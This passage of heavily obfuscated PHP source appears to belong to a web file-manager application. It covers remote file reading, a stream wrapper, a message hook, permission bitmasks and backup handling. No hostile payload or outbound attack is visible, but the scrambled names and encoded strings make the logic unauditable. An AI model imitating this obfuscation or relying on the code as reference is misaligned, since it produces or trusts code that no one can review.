_get($¹Öõëì€, $Âº¡Îêè[346], 0); $Öº ’Ñ• = array($Âº¡Îêè[32] => $¹Öõëì€[$Âº¡Îêè[32]], $Âº¡Îêè[84] => $ÛóèÅ¬Î, $Âº¡Îêè[33] => $Âº¡Îêè[199], $Âº¡Îêè[76] => intval($¢‹¤®–ß), $Âº¡Îêè[174] => get_path_ext($¹Öõëì€[$Âº¡Îêè[32]]), $Âº¡Îêè[1369] => $¢‹¤®–ß > 0 && $¹Öõëì€[$Âº¡Îêè[1491]], $Âº¡Îêè[1370] => !1); return $Öº ’Ñ•; } private function header($®Ñ¡ìŒ¹) { $Ü©º¼µ½ =& $_SERVER[ĞÆÏ¡Îª]; if (isset(self::$_cacheHeader[$®Ñ¡ìŒ¹])) { return self::$_cacheHeader[$®Ñ¡ìŒ¹]; } $µ‰Ÿ·à = isset($GLOBALS[$Ü©º¼µ½[1492]]) ? $GLOBALS[$Ü©º¼µ½[1492]] : !1; $GLOBALS[$Ü©º¼µ½[1492]] = !0; self::$_cacheHeader[$®Ñ¡ìŒ¹] = url_header($®Ñ¡ìŒ¹); $GLOBALS[$Ü©º¼µ½[1492]] = $µ‰Ÿ·à; return self::$_cacheHeader[$®Ñ¡ìŒ¹]; } public function hashSimple($‘’ë‡©, $•Œ¡ïé¶ = false) { $«á”éİÎ =& $_SERVER[ĞÆÏ¡Îª]; $ñÏ”Ÿ¡ä = $this->info($‘’ë‡©); if (!$ñÏ”Ÿ¡ä || !$ñÏ”Ÿ¡ä[$«á”éİÎ[201]]) { return !1; } $ã®™Â¿€ = $ñÏ”Ÿ¡ä[$«á”éİÎ[76]]; $íğî¡¡Ÿ = 200; $–ş²²ß = 50; if ($ã®™Â¿€ <= $íğî¡¡Ÿ * $–ş²²ß) { return md5($this->fileSubstr($‘’ë‡©, 0, $ã®™Â¿€)) . $ã®™Â¿€; } $“üÎ×âï = intval($ã®™Â¿€ / $–ş²²ß); $‚õ–ñ«Á = $«á”éİÎ[12]; $ÏØğãİ´ = timeFloat(); $ÏğğŞËÁ = 15; for ($š…æÅ‹¹ = 0; $š…æÅ‹¹ < $–ş²²ß; $š…æÅ‹¹++) { if (timeFloat() - $ÏØğãİ´ > $ÏğğŞËÁ) { return !1; } $Åê½´ÃÙ = $this->fileSubstr($‘’ë‡©, $“üÎ×âï * $š…æÅ‹¹, $íğî¡¡Ÿ); if (!$Åê½´ÃÙ) { return !1; } $‚õ–ñ«Á .= $Åê½´ÃÙ; } $‚õ–ñ«Á .= $this->fileSubstr($‘’ë‡©, $ã®™Â¿€ - $íğî¡¡Ÿ, $íğî¡¡Ÿ); return md5($‚õ–ñ«Á) . $ã®™Â¿€; } public function getContent($Ûìâ¤é±) { return $this->fileSubstr($Ûìâ¤é±); } public function fileSubstr($“˜º¤Ğ, $¿ü…Îå = 0, $…åöë = -1) { $ãËïş˜Æ =& $_SERVER[ĞÆÏ¡Îª]; $Ú›´ÁŸÇ = $this->info($“˜º¤Ğ); if (!$Ú›´ÁŸÇ || !$Ú›´ÁŸÇ[$ãËïş˜Æ[201]] && $Ú›´ÁŸÇ[$ãËïş˜Æ[76]] > 1024 * 1024 * 10) { return !1; } if ($…åöë === -1) { $…åöë = $Ú›´ÁŸÇ[$ãËïş˜Æ[76]]; } if ($…åöë == 0) { return $ãËïş˜Æ[12]; } $ˆî¿áÌú = array($ãËïş˜Æ[1493] . $¿ü…Îå . $ãËïş˜Æ[777] . ($¿ü…Îå + $…åöë - 1)); $Ö˜çÏŸ = url_request($“˜º¤Ğ, $ãËïş˜Æ[230], !1, $ˆî¿áÌú, !1, !1, 1); return $Ö˜çÏŸ[$ãËïş˜Æ[1184]] ? $Ö˜çÏŸ[$ãËïş˜Æ[1184]] : $ãËïş˜Æ[12]; } public function download($Á°…õÇÓ, $î§ö¢ôı) { Downloader::start($Á°…õÇÓ, $î§ö¢ôı); return $î§ö¢ôı; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($¥ªœÙãŠ, $ò¬¡ŒôÏ = '') { $this->info = $this->info($¥ªœÙãŠ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ĞÆÏ¡Îª][84]]; $this->pathOpen = $¥ªœÙãŠ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$¥ªœÙãŠ])) { self::$_chunkBuffer[$¥ªœÙãŠ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($»ÌÙíï) { $…Ÿó‹„• = $this->fileSubstr($this->pose, $»ÌÙíï); $this->pose += strlen($…Ÿó‹„•); return $…Ÿó‹„•; } public function stream_tell() { return $this->pose; } public function stream_seek($ìÂ‚À¢, $¦¦·Ü³°) { $ÍéñØå“ =& $_SERVER[ĞÆÏ¡Îª]; if ($¦¦·Ü³° == SEEK_SET) { $this->pose = $ìÂ‚À¢; } else { if ($¦¦·Ü³° == SEEK_CUR) { $this->pose += $ìÂ‚À¢; } else { if ($¦¦·Ü³° == SEEK_END) { $this->pose = $this->info[$ÍéñØå“[76]] + intval($ìÂ‚À¢); } } } if ($ìÂ‚À¢ < 0) { $this->pose = $this->info[$ÍéñØå“[76]] + $ìÂ‚À¢; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ĞÆÏ¡Îª][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($È±üóª£, $±î½ãçÕ) { $ˆ¿í÷ÜÕ =& $_SERVER[ĞÆÏ¡Îª]; $Èµõıùö = $this->info($È±üóª£); return array($ˆ¿í÷ÜÕ[1494] => 0, $ˆ¿í÷ÜÕ[1495] => 0, $ˆ¿í÷ÜÕ[16] => 32768 + 511, $ˆ¿í÷ÜÕ[1496] => 0, $ˆ¿í÷ÜÕ[1497] => 0, $ˆ¿í÷ÜÕ[1498] => 0, $ˆ¿í÷ÜÕ[1499] => 0, $ˆ¿í÷ÜÕ[76] => $Èµõıùö[$ˆ¿í÷ÜÕ[76]], $ˆ¿í÷ÜÕ[1500] => $Èµõıùö[$ˆ¿í÷ÜÕ[1368]], $ˆ¿í÷ÜÕ[1456] => $Èµõıùö[$ˆ¿í÷ÜÕ[85]], $ˆ¿í÷ÜÕ[1455] => $Èµõıùö[$ˆ¿í÷ÜÕ[200]], $ˆ¿í÷ÜÕ[1501] => 0, $ˆ¿í÷ÜÕ[1502] => 0); } static $fileInfo = array(); public function info($ÅæŒî¤¯) { $Šó•­š = $_SERVER[ĞÆÏ¡Îª][1503]; if (isset(self::$fileInfo[$ÅæŒî¤¯])) { return self::$fileInfo[$ÅæŒî¤¯]; } if (substr($ÅæŒî¤¯, 0, strlen($Šó•­š)) != $Šó•­š) { return !1; } self::$fileInfo[$ÅæŒî¤¯] = IO::info(substr($ÅæŒî¤¯, strlen($Šó•­š))); return self::$fileInfo[$ÅæŒî¤¯]; } public static function read($åÀÖ¾õ¢, $‚¾±ÈÛó, $ÒÜ£âÙÀ) { if (!isset(self::$_fopenCache[$åÀÖ¾õ¢])) { $ßİÜ»ÎÉ = new StreamWrapperIO(); $ßİÜ»ÎÉ->stream_open($åÀÖ¾õ¢); self::$_fopenCache[$åÀÖ¾õ¢] = $ßİÜ»ÎÉ; } $ßİÜ»ÎÉ = self::$_fopenCache[$åÀÖ¾õ¢]; return $ßİÜ»ÎÉ->fileSubstr($‚¾±ÈÛó, $ÒÜ£âÙÀ); } public static function _read($ÏÚ€–ñÆ, $àèË¥ø, $¦Éï—’) { $ÇøøÌ…ö =& $_SERVER[ĞÆÏ¡Îª]; $¶ûˆïÈ¤ = fopen($ÏÚ€–ñÆ, $ÇøøÌ…ö[1372]); if (!$¶ûˆïÈ¤) { return $ÇøøÌ…ö[12]; } $Ç³øîÆÆ = 8192; fseek($¶ûˆïÈ¤, $àèË¥ø, SEEK_SET); $õ€•ÏÊ± = $ÇøøÌ…ö[12]; $Ï’À¢ôæ = 0; while ($Ï’À¢ôæ < $¦Éï—’) { $¾Áé˜¢— = min($Ç³øîÆÆ, $¦Éï—’ - $Ï’À¢ôæ); $õ€•ÏÊ± .= fread($¶ûˆïÈ¤, $¾Áé˜¢—); $Ï’À¢ôæ += $¾Áé˜¢—; } fclose($¶ûˆïÈ¤); return $õ€•ÏÊ±; } public function fileSubstr($ëŠ€óÒ¦, $Äã °÷Â) { $“é»Íë =& $_SERVER[ĞÆÏ¡Îª]; $éıè‹ùü = $this->info[$“é»Íë[76]]; $Û¯Ûó¶Æ = $ëŠ€óÒ¦; $Ñƒîì†Œ = $Äã °÷Â; if ($ëŠ€óÒ¦ < 0) { $ëŠ€óÒ¦ = $éıè‹ùü + $ëŠ€óÒ¦; } if ($Äã °÷Â === !1) { $Äã °÷Â = $éıè‹ùü - $ëŠ€óÒ¦; } if ($ëŠ€óÒ¦ + $Äã °÷Â > $éıè‹ùü) { $Äã °÷Â = $éıè‹ùü - $ëŠ€óÒ¦; } if ($Äã °÷Â <= 0) { return $“é»Íë[12]; } if ($ëŠ€óÒ¦ < 0 || $ëŠ€óÒ¦ >= $éıè‹ùü || $Äã °÷Â <= 0 || $Äã °÷Â > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\151\x6c\145\122\x65\x61\144\40\x65\x72\x72\x6f\162\41\x20\163\164\141\x72\164\75{$ëŠ€óÒ¦}\73\x6c\145\156\x67\164\150\x3d{$Äã °÷Â}\73\40\163\151\x7a\x65\x3d{$éıè‹ùü}\73"); } $Ëùçéı› = 64 * 1024; $úÂ¼ü¹ =& self::$_chunkBuffer[$this->path]; if (!$úÂ¼ü¹) { $úÂ¼ü¹ = array(); } $óÊ±ãĞ¤ = 0; $È±ËÍÒÖ = 0; $óÕÌÛŠÆ = $“é»Íë[12]; foreach ($úÂ¼ü¹ as $óÊ±ãĞ¤ => $óÕÌÛŠÆ) { $óÊ±ãĞ¤ = intval($óÊ±ãĞ¤); $È±ËÍÒÖ = $óÊ±ãĞ¤ + strlen($óÕÌÛŠÆ); if ($ëŠ€óÒ¦ >= $È±ËÍÒÖ) { continue; } if ($ëŠ€óÒ¦ >= $óÊ±ãĞ¤ && $ëŠ€óÒ¦ + $Äã °÷Â <= $È±ËÍÒÖ) { return substr($óÕÌÛŠÆ, $ëŠ€óÒ¦ - $óÊ±ãĞ¤, $Äã °÷Â); } break; } if (count($úÂ¼ü¹) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($“é»Íë[1504], $“é»Íë[1505] . count($úÂ¼ü¹) . "\x3b\163\x74\141\162\164\x3d{$ëŠ€óÒ¦}\x2c\x6c\x65\156\147\164\x68\75{$Äã °÷Â}\x3b\160\x6f\163\145\72{$óÊ±ãĞ¤}\176{$È±ËÍÒÖ}"); throw new Exception($“é»Íë[1506]); } $İÔ¡ŠÆ€ = intval($ëŠ€óÒ¦ / $Ëùçéı›) * $Ëùçéı›; $¾€ä¡Ğ“ = ceil(($ëŠ€óÒ¦ + $Äã °÷Â) / $Ëùçéı›) * $Ëùçéı› - $İÔ¡ŠÆ€; $ÑÚ…Úáû = IO::fileSubstr($this->path, $İÔ¡ŠÆ€, $¾€ä¡Ğ“); $úÂ¼ü¹[$İÔ¡ŠÆ€ . $“é»Íë[12]] = $ÑÚ…Úáû; ksort($úÂ¼ü¹); $”ç«âæœ = substr($ÑÚ…Úáû, $ëŠ€óÒ¦ - $İÔ¡ŠÆ€, $Äã °÷Â); return $”ç«âæœ; } private function log($¦‹ªÆèÒ, $¯¼€ì÷Ç) { $Œü’Å€Ñ =& $_SERVER[ĞÆÏ¡Îª]; $¸·à´¬¸ = timeFloat() - $this->timeStart; write_log(sprintf($Œü’Å€Ñ[1507], $¦‹ªÆèÒ, $this->info[$Œü’Å€Ñ[32]], $¸·à´¬¸, $¯¼€ì÷Ç), $Œü’Å€Ñ[1174]); } } class Message { function __construct() { } public function send($ªß¨½†  = '', $ìÃ¸¤íŸ = array(), $»‹–Ù¡ = "\164\x65\x78\x74") { $ª¡Òó‰Ì =& $_SERVER[ĞÆÏ¡Îª]; $âÆ¦Êƒ = array($ª¡Òó‰Ì[33] => $ª¡Òó‰Ì[1508], $ª¡Òó‰Ì[750] => $ªß¨½† ); if (in_array($»‹–Ù¡, array($ª¡Òó‰Ì[1508], $ª¡Òó‰Ì[1509]))) { $âÆ¦Êƒ[$ª¡Òó‰Ì[33]] = $»‹–Ù¡; } $ìÃ¸¤íŸ = array($ª¡Òó‰Ì[524] => isset($ìÃ¸¤íŸ[$ª¡Òó‰Ì[524]]) ? $ìÃ¸¤íŸ[$ª¡Òó‰Ì[524]] : $ª¡Òó‰Ì[12], $ª¡Òó‰Ì[609] => isset($ìÃ¸¤íŸ[$ª¡Òó‰Ì[609]]) ? $ìÃ¸¤íŸ[$ª¡Òó‰Ì[609]] : $ª¡Òó‰Ì[12]); if (empty($ªß¨½† ) || empty($ìÃ¸¤íŸ[$ª¡Òó‰Ì[524]]) && empty($ìÃ¸¤íŸ[$ª¡Òó‰Ì[609]])) { return !1; } $«¢ñË¶ä = array($ª¡Òó‰Ì[1449] => $âÆ¦Êƒ, $ª¡Òó‰Ì[1510] => $ìÃ¸¤íŸ); Hook::trigger($ª¡Òó‰Ì[1511], $«¢ñË¶ä); } } goto fŠ‚…±ç’¬; d“Îºæ¦ÏĞ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $‘ùİğÅ˜ =& $_SERVER[ĞÆÏ¡Îª]; $†°ñÍ“À = array(array($‘ùİğÅ˜[429] => LNG($‘ùİğÅ˜[1820]), $‘ùİğÅ˜[1821] => $‘ùİğÅ˜[1822], $‘ùİğÅ˜[1823] => 1, $‘ùİğÅ˜[1824] => 1, $‘ùİğÅ˜[1825] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($‘ùİğÅ˜[429] => LNG($‘ùİğÅ˜[1826]), $‘ùİğÅ˜[1821] => $‘ùİğÅ˜[1827], $‘ùİğÅ˜[1823] => 2, $‘ùİğÅ˜[1824] => 1, $‘ùİğÅ˜[1825] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($‘ùİğÅ˜[429] => LNG($‘ùİğÅ˜[1828]), $‘ùİğÅ˜[1821] => $‘ùİğÅ˜[1829], $‘ùİğÅ˜[1823] => 3, $‘ùİğÅ˜[1824] => 1, $‘ùİğÅ˜[1825] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($‘ùİğÅ˜[429] => LNG($‘ùİğÅ˜[1830]), $‘ùİğÅ˜[1821] => $‘ùİğÅ˜[1831], $‘ùİğÅ˜[1823] => 4, $‘ùİğÅ˜[1824] => 1, $‘ùİğÅ˜[1825] => self::AUTH_SHOW | self::AUTH_VIEW), array($‘ùİğÅ˜[429] => LNG($‘ùİğÅ˜[1832]), $‘ùİğÅ˜[1821] => $‘ùİğÅ˜[1833], $‘ùİğÅ˜[1823] => 5, $‘ùİğÅ˜[1824] => 1, $‘ùİğÅ˜[1825] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($‘ùİğÅ˜[429] => LNG($‘ùİğÅ˜[1834]), $‘ùİğÅ˜[1821] => $‘ùİğÅ˜[1835], $‘ùİğÅ˜[1823] => 6, $‘ùİğÅ˜[1824] => 1, $‘ùİğÅ˜[1825] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($‘ùİğÅ˜[429] => LNG($‘ùİğÅ˜[1836]), $‘ùİğÅ˜[1821] => $‘ùİğÅ˜[1837], $‘ùİğÅ˜[1823] => 7, $‘ùİğÅ˜[1824] => 1, $‘ùİğÅ˜[1825] => 0)); return $†°ñÍ“À; } public static function authCheck($Åúœ´áô, $¹Ç º§œ) { $ÎüÛÊğ =& $_SERVER[ĞÆÏ¡Îª]; $Åúœ´áô = intval($Åúœ´áô); if ($GLOBALS[$ÎüÛÊğ[512]] && $GLOBALS[$ÎüÛÊğ[6]][$ÎüÛÊğ[1838]]) { return !0; } if ($Åúœ´áô <= 0) { return !1; } if (($Åúœ´áô & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Åúœ´áô & $¹Ç º§œ); } public static function authCheckShow($“åÒÏØ) { return self::authCheck($“åÒÏØ, self::AUTH_SHOW); } public static function authCheckView($š»’ÃÄÕ) { return self::authCheck($š»’ÃÄÕ, self::AUTH_VIEW); } public static function authCheckDownload($Úö›Ñ) { return self::authCheck($Úö›Ñ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($µöÆí¨‰) { return self::authCheck($µöÆí¨‰, self::AUTH_UPLOAD); } public static function authCheckEdit($ñ±ªÍ·å) { return self::authCheck($ñ±ªÍ·å, self::AUTH_EDIT); } public static function authCheckRemove($¨…¼ÚÛ¾) { return self::authCheck($¨…¼ÚÛ¾, self::AUTH_REMOVE); } public static function authCheckShare($ï¯Œ˜âô) { return self::authCheck($ï¯Œ˜âô, self::AUTH_SHARE); } public static function authCheckComment($œ²ö²¡¶) { return self::authCheck($œ²ö²¡¶, self::AUTH_COMMENT); } public static function authCheckEvent($ÜÃ‰áå) { return self::authCheck($ÜÃ‰áå, self::AUTH_EVENT); } public static function authCheckRoot($Øâ¹¤øò) { return self::authCheck($Øâ¹¤øò, self::AUTH_ROOT); } public static function authCheckAction($Ø‚áİøº, $Åä²Èò›) { $¥«ÌÙ¸³ =& $_SERVER[ĞÆÏ¡Îª]; $™íÂ¿–À = array($¥«ÌÙ¸³[1839] => self::AUTH_VIEW, $¥«ÌÙ¸³[1190] => self::AUTH_DOWNLOAD, $¥«ÌÙ¸³[107] => self::AUTH_UPLOAD, $¥«ÌÙ¸³[1789] => self::AUTH_EDIT, $¥«ÌÙ¸³[1788] => self::AUTH_REMOVE, $¥«ÌÙ¸³[1799] => self::AUTH_SHARE, $¥«ÌÙ¸³[363] => self::AUTH_COMMENT, $¥«ÌÙ¸³[1635] => self::AUTH_EVENT, $¥«ÌÙ¸³[1840] => self::AUTH_ROOT); if (!isset($™íÂ¿–À[$Åä²Èò›])) { return; } $êÜ­Í½ã = $™íÂ¿–À[$Åä²Èò›]; $Ø‚áİøº = intval($Ø‚áİøº); if ($Ø‚áİøº <= 0) { return !1; } if (($Ø‚áİøº & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ø‚áİøº & $êÜ­Í½ã); } public static function authDisable($º†àÛ¶„, $âÎîøÜ£) { if (intval($º†àÛ¶„) <= 0) { return 0; } return intval($º†àÛ¶„) & ~$âÎîøÜ£; } public $optionType = "\123\171\163\x74\x65\155\56\163\157\x75\x72\x63\145\101\x75\x74\150\x4c\x69\x73\164"; public $field = array("\156\141\x6d\145", "\x61\165\164\x68", "\154\x61\142\145\x6c", "\x64\151\163\x70\x6c\x61\x79", "\163\x79\163\x74\145\x6d", "\163\x6f\x72\164"); public function initData() { $Ì­ò¥ö = $this->authDefault(); foreach ($Ì­ò¥ö as $¢º¡¸î™) { $this->add($¢º¡¸î™); } } public function findAuth($´àØÌÈô, $º‘†Œ§) { $ŸõĞÏ© =& $_SERVER[ĞÆÏ¡Îª]; $ÌÎó‘²• = parent::listData(); foreach ($ÌÎó‘²• as $ÛŠ´Ö‘Ù) { $÷´‹‘“¼ = intval($ÛŠ´Ö‘Ù[$ŸõĞÏ©[422]]); if ($÷´‹‘“¼ <= 0 || $ÛŠ´Ö‘Ù[$ŸõĞÏ©[1841]] == 0) { continue; } if (($÷´‹‘“¼ & $´àØÌÈô) != $´àØÌÈô) { continue; } if (($÷´‹‘“¼ & $º‘†Œ§) != 0) { continue; } return $ÛŠ´Ö‘Ù[$ŸõĞÏ©[407]]; } return !1; } public function findAuthReadOnly() { $ÔÑÙÊ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $‚æ­í¦ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ÔÑÙÊ, $‚æ­í¦); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $›“¯Š‹Â =& $_SERVER[ĞÆÏ¡Îª]; $Ï§ˆ§¦Ç = parent::listData(); $ˆ…í‰¯Ë = !1; foreach ($Ï§ˆ§¦Ç as $¯†ü) { if ($¯†ü[$›“¯Š‹Â[422]] <= 0 || $¯†ü[$›“¯Š‹Â[1841]] == $›“¯Š‹Â[197]) { continue; } if (!$ˆ…í‰¯Ë) { $ˆ…í‰¯Ë = $¯†ü; continue; } if ($ˆ…í‰¯Ë[$›“¯Š‹Â[422]] > $¯†ü[$›“¯Š‹Â[422]]) { $ˆ…í‰¯Ë = $¯†ü; } } return $ˆ…í‰¯Ë ? $ˆ…í‰¯Ë[$›“¯Š‹Â[407]] : $›“¯Š‹Â[12]; } public function listData($¡¥ß³‰ = false, $ü¿íï·… = "\163\x6f\x72\x74", $Îï©ôÖì = false) { return parent::listData($¡¥ß³‰, $ü¿íï·…, $Îï©ôÖì); } public function update($Ñ Æœ¼‚, $³ö÷€ÚÆ) { $íå›†Ë¼ =& $_SERVER[ĞÆÏ¡Îª]; $çßÎ¡‹ë = parent::listData($Ñ Æœ¼‚); $á«©öˆ = $this->findByName($³ö÷€ÚÆ[$íå›†Ë¼[32]]); if (!$çßÎ¡‹ë || $á«©öˆ && $á«©öˆ[$íå›†Ë¼[407]] != $çßÎ¡‹ë[$íå›†Ë¼[407]]) { return !1; } $this->filterAuth($³ö÷€ÚÆ[$íå›†Ë¼[422]]); return parent::update($Ñ Æœ¼‚, $³ö÷€ÚÆ); } public function remove($øü¢ó®ê) { $Á¾ÄÛ©· = parent::listData($øü¢ó®ê); if (!$Á¾ÄÛ©· || $Á¾ÄÛ©·[$_SERVER[ĞÆÏ¡Îª][1267]]) { return !1; } return parent::remove($øü¢ó®ê); } public function add($óç»çğ = array()) { $‘Ëôá©Î =& $_SERVER[ĞÆÏ¡Îª]; if ($this->findByName($óç»çğ[$‘Ëôá©Î[32]])) { return !1; } $¿»öú¤Õ = array($‘Ëôá©Î[32] => $‘Ëôá©Î[12], $‘Ëôá©Î[422] => 1, $‘Ëôá©Î[1842] => $‘Ëôá©Î[1829], $‘Ëôá©Î[1841] => 1, $‘Ëôá©Î[1267] => 0, $‘Ëôá©Î[1843] => 0); $óç»çğ = array_merge($¿»öú¤Õ, $óç»çğ); $óç»çğ[$‘Ëôá©Î[1843]] = $this->getSort(); $this->filterAuth($óç»çğ[$‘Ëôá©Î[422]]); return parent::insert($óç»çğ); } private function getSort() { $«İÎÑŒÂ =& $_SERVER[ĞÆÏ¡Îª]; $µµ…ëë = parent::listData(); $Æú×¤Û = array_to_keyvalue($µµ…ëë, $«İÎÑŒÂ[12], $«İÎÑŒÂ[1843]); return empty($Æú×¤Û) ? 0 : max($Æú×¤Û) + 1; } private function filterAuth(&$šÙ¾óøœ) { if (!$šÙ¾óøœ) { return; } $”®ÄŠÇ´ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $­Œ×ØıÛ = array(); foreach ($”®ÄŠÇ´ as $†ûù¦öı) { if ($šÙ¾óøœ & $†ûù¦öı) { $­Œ×ØıÛ[] = $†ûù¦öı; } } if (in_array(self::AUTH_ROOT, $­Œ×ØıÛ)) { $šÙ¾óøœ = array_sum($”®ÄŠÇ´); return; } $¨æƒÉü = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($­Œ×ØıÛ as $†ûù¦öı) { if (isset($¨æƒÉü[$†ûù¦öı])) { $­Œ×ØıÛ = array_merge($­Œ×ØıÛ, $¨æƒÉü[$†ûù¦öı]); } } $­Œ×ØıÛ[] = self::AUTH_SHOW; $šÙ¾óøœ = array_sum(array_unique($­Œ×ØıÛ)); } public function sort($¦Œšî, $İ¼Ô·Å¥) { return parent::update($¦Œšî, $İ¼Ô·Å¥); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\x6d\x2e\142\141\143\153\165\x70\114\x69\163\164"; public $field = array("\x69\157", "\156\141\x6d\145", "\x73\x74\x61\x74\x75\163", "\143\x6f\x6e\164\x65\x6e\x74", "\x6d\x61\156\165\141\154", "\162\x65\x73\x75\x6c\164", "\164\x69\x6d\x65\x46\x72\157\155", "\x74\x69\155\145\x54\157"); public function config() { $Ë¦˜¿ =& $_SERVER[ĞÆÏ¡Îª]; $´•ÛëÁ = Model($Ë¦˜¿[765])->get($Ë¦˜¿[775]); $´•ÛëÁ = json_decode($´•ÛëÁ, !0); $´•ÛëÁ = is_array($´•ÛëÁ) ? $´•ÛëÁ : array(); if (!isset($´•ÛëÁ[$Ë¦˜¿[750]])) { $´•ÛëÁ[$Ë¦˜¿[750]] = $Ë¦˜¿[88]; } unset($´•ÛëÁ[$Ë¦˜¿[1617]]); Action($Ë¦˜¿[1844])->taskInit(); Model($Ë¦˜¿[1616])->cacheClear(); $Ÿ–Ô¯…û = $Ë¦˜¿[1845]; $¡Èé¢å® = Model($Ë¦˜¿[1846])->findByKey($Ë¦˜¿[1635], $Ÿ–Ô¯…û); if (!$¡Èé¢å®) { $¡Èé¢å® = array(); } if (isset($¡Èé¢å®[$Ë¦˜¿[203]])) { $¡Èé¢å®[$Ë¦˜¿[203]] = json_decode($¡Èé¢å®[$Ë¦˜¿[203]], !0); } if (isset($´•ÛëÁ[$Ë¦˜¿[203]])) { $¡Èé¢å®[$Ë¦˜¿[203]][$Ë¦˜¿[1620]] = $´•ÛëÁ[$Ë¦˜¿[203]]; unset($´•ÛëÁ[$Ë¦˜¿[203]]); } return array_merge($¡Èé¢å®, $´•ÛëÁ); } public function listData($ÃÊ¤½ƒ¡ = false, $¡ûüµœ´ = "\x6d\157\x64\x69\146\171\124\151\155\145", $Ñ¾ô·Ä© = false) { return parent::listData($ÃÊ¤½ƒ¡, $¡ûüµœ´, !0); } public function lastItem() { $½”«î¡ù = $this->listData(); return !empty($½”«î¡ù[0]) ? $½”«î¡ù[0] : null; } public function kill($­Ï‰³×µ) { $Ä²Ø°ƒğ =& $_SERVER[ĞÆÏ¡Îª]; $‡€ú È­ = $this->listData($­Ï‰³×µ); if (!$‡€ú È­ || empty($‡€ú È­[$Ä²Ø°ƒğ[32]])) { return !0; } Task::kill($Ä²Ø°ƒğ[774]); Task::kill($Ä²Ø°ƒğ[795]); Task::kill($Ä²Ø°ƒğ[804]); $³‘çà¿¶ = $‡€ú È­[$Ä²Ø°ƒğ[32]]; $İĞÙµ‡° = TEMP_FILES . $Ä²Ø°ƒğ[773] . $³‘çà¿¶ . $Ä²Ø°ƒğ[8]; IO::remove($İĞÙµ‡°, !1); return $this->remove($­Ï‰³×µ); } public function remove($‚‰—íĞİ) { $›ÏÛŠöğ = $this->listData($‚‰—íĞİ); if (!$›ÏÛŠöğ) { return !0; } return $this->backupRemove($›ÏÛŠöğ); } private function backupRemove($¡ö¬ıêè) { parent::remove($¡ö¬ıêè[$_SERVER[ĞÆÏ¡Îª][407]]); $‰ú’Õ¥â = $this->backupPath($¡ö¬ıêè); IO::remove($‰ú’Õ¥â, !1); return !0; } private function backupPath($ÆŸ£ÎÖĞ) { $…Ù¨–ïŒ =& $_SERVER[ĞÆÏ¡Îª]; $õŒá‚®ª = $ÆŸ£ÎÖĞ[$…Ù¨–ïŒ[32]]; $ìäŒ¢Å = Model($…Ù¨–ïŒ[765])->get($…Ù¨–ïŒ[766]); $İşˆ²Û¿ = substr(md5($…Ù¨–ïŒ[767] . $ìäŒ¢Å . $õŒá‚®ª), 0, 8); return "\x7b\x69\157\72{$ÆŸ£ÎÖĞ[$…Ù¨–ïŒ[747]]}\x7d\x2f\144\x61\164\141\x62\x61\163\145\x2f\x62\x61\x63\153\165\160\x2f" . $õŒá‚®ª . $…Ù¨–ïŒ[11] . $İşˆ²Û¿; } public function start() { $ùÊä²Ğ =& $_SERVER[ĞÆÏ¡Îª]; if ($GLOBALS[$ùÊä²Ğ[6]][$ùÊä²Ğ[89]][$ùÊä²Ğ[1847]] != $ùÊä²Ğ[88]) { return !0; } $é¦ç·• = $this->config(); if (!$é¦ç·• || $é¦ç·•[$ùÊä²Ğ[1617]] != $ùÊä²Ğ[88]) { return !1; } $ù¬  ÏĞ = 